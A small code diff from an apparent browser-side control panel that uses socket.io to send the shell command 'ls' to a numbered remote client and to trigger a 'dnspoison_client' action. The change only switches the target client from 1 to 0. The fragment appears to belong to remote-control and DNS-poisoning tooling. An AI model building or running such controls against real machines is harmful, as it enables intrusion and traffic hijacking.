@@ -21,11 +21,11 @@
                     document.querySelector("#clients").innerHTML = JSON.stringify(data);
 
 
-                    socket.emit('send_client_cmd', { toclient: 1, cmd: 'ls' }, function (data) {
+                    socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
                         console.log(data) 
                     });
 
-                    socket.emit('dnspoison_client', { toclient: 1 }, function (data) {
+                    socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
                         console.log(data) 
                     });
 
